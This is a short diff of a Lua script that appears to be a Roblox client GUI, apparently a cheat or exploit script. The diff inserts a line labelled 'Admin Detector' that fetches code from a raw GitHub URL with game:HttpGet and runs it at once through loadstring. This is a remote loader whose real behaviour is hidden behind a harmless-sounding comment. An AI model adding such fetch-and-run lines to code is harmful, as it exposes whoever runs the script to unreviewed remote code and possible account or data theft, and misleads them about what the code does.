@@ -8,6 +8,10 @@ CoreGui:SetCore("SendNotification", {
     Duration = 2.5,
 })
 
+--Admin Detector in Server
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Admin'))()
+--
+
 local ScrollGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Title = Instance.new("TextButton")
